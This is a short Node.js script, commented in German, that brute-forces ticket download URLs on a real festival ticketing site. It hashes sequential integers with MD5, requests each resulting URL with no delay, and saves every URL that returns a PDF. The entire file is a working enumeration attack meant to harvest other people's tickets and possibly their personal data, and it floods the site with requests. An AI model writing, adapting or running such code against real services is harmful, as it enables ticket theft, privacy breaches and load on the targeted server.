const https = require('https');
const fs = require('fs');
const crypto = require('crypto');

const baseUrl = 'https://nolimitsfestivals.nl/tickets/';
const delay = 0; // 1 Sekunde Verzögerung
const hashesFile = 'processedHashes.txt';

function md5(data) {
    return crypto.createHash('md5').update(data).digest("hex");
}

async function fetchURL(url) {
    return new Promise((resolve, reject) => {
        https.get(url, (res) => {
            const { statusCode } = res;
            const contentType = res.headers['content-type'];

            if (statusCode !== 200) {
                reject(new Error(`Fehler beim Abruf von ${url}. Status Code: ${statusCode}`));
                res.resume();
                return;
            }

            if (contentType === 'application/pdf') {
                console.log('Success')
                fs.appendFileSync('foundURLs.txt', `${url}\n`);
            } else {
                console.log('Failure')
            }
            
            res.resume();
            resolve();
        }).on('error', (e) => {
            reject(e);
        });
    });
}

async function bruteForceMD5() {
    let processedHashes = new Set();

    // Lade bereits bearbeitete Hashes aus der Datei
    if (fs.existsSync(hashesFile)) {
        const hashesFromFile = fs.readFileSync(hashesFile, 'utf-8').split('\n');
        for (const hash of hashesFromFile) {
            processedHashes.add(hash.trim());
        }
    }

    for (let i = 0; i < Math.pow(2, 24); i++) { // Limitiert auf 16 Millionen Versuche für Demonstrationszwecke
        let hash = md5(i.toString());

        if (processedHashes.has(hash)) continue; // Überspringe, wenn bereits bearbeitet

        let fullUrl = baseUrl + hash + '/';
        
        await fetchURL(fullUrl);
        await new Promise(resolve => setTimeout(resolve, delay));

        fs.appendFileSync(hashesFile, `${hash}\n`);
        processedHashes.add(hash);
    }
}

bruteForceMD5()
    .then(() => {
        console.log('Fertig.');
    })
    .catch((err) => {
        console.error('Ein Fehler ist aufgetreten:', err);
    });
